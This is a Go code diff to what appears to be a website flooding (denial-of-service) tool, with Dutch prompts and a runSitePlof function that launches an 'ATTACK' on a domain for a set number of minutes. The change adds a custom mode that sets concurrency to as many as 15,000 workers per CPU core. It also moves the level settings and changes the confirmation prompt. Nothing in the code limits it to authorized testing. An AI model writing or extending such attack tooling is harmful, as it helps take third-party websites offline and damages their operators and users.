@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -275,13 +276,31 @@ func runSitePlof(o options) {
 	fmt.Printf("[*] Geadviseerd Attack Level: %d (1-10)\n", advLevel)
 
 	// Step 2: Level selection
-	levelStr := promptInput("Op welk level wil je de aanval runnen?", "Kies 1-10", "")
-	fmt.Sscanf(levelStr, "%d", &o.level)
-	if o.level < 1 { o.level = 1 }
-	if o.level > 10 { o.level = 10 }
+	levelStr := promptInput("Op welk level wil je de aanval runnen? (1-10 of 'C' voor CUSTOM)", "Kies 1-10 / C", "")
+	
+	if strings.ToUpper(levelStr) == "C" {
+		maxRec := measureSystemResources()
+		fmt.Printf("\n[CUSTOM MODE] Systeem Capaciteit:\n")
+		fmt.Printf("  CPU Cores: %d\n", runtime.NumCPU())
+		fmt.Printf("  Geadviseerde Max Workers: %d\n", maxRec)
+		
+		customIn := promptInput("Hoeveel workers wil je gebruiken? (bijv. 10000 of 'max')", "Aantal / max", "")
+		if strings.ToLower(customIn) == "max" {
+			o.concurrency = maxRec
+			fmt.Printf("[*] Setting to MAX: %d workers\n", o.concurrency)
+		} else {
+			fmt.Sscanf(customIn, "%d", &o.concurrency)
+		}
+		if o.concurrency <= 0 { o.concurrency = 1000 }
+	} else {
+		fmt.Sscanf(levelStr, "%d", &o.level)
+		if o.level < 1 { o.level = 1 }
+		if o.level > 10 { o.level = 10 }
+		applyLevelSettings(&o)
+	}
 
 	// Step 3: Confirmation
-	confirm := promptInput(fmt.Sprintf("Weet je zeker dat je Level %d wilt runnen? (j/n)", o.level), "", "")
+	confirm := promptInput(fmt.Sprintf("Weet je zeker dat je met %d workers wilt runnen? (j/n)", o.concurrency), "j/n", "")
 	if strings.ToLower(confirm) != "j" {
 		fmt.Println("Aanval afgebroken.")
 		return
@@ -292,11 +311,17 @@ func runSitePlof(o options) {
 	fmt.Sscanf(timeStr, "%d", &o.attackMinutes)
 	if o.attackMinutes <= 0 { o.attackMinutes = 1 }
 
-	fmt.Printf("\n🚀 ATTACK STARTED: %s | Level %d | Duur: %d min\n", domain, o.level, o.attackMinutes)
+	fmt.Printf("\n🚀 ATTACK STARTED: %s | Workers: %d | Duur: %d min\n", domain, o.concurrency, o.attackMinutes)
 	fmt.Println("Druk op Ctrl+C om de aanval voortijdig te stoppen.")
 	
-	applyLevelSettings(&o)
 	runAttack([]string{domain}, o)
+}
+
+func measureSystemResources() int {
+	cpus := runtime.NumCPU()
+	// Conservative estimate: 15.000 workers per core is usually safe for Go on modern OS
+	// Max limit for "max max max" should be high but not crash the OS
+	return cpus * 15000
 }
 
 func startHealthMonitor(s *domainStats, deadline time.Time) {
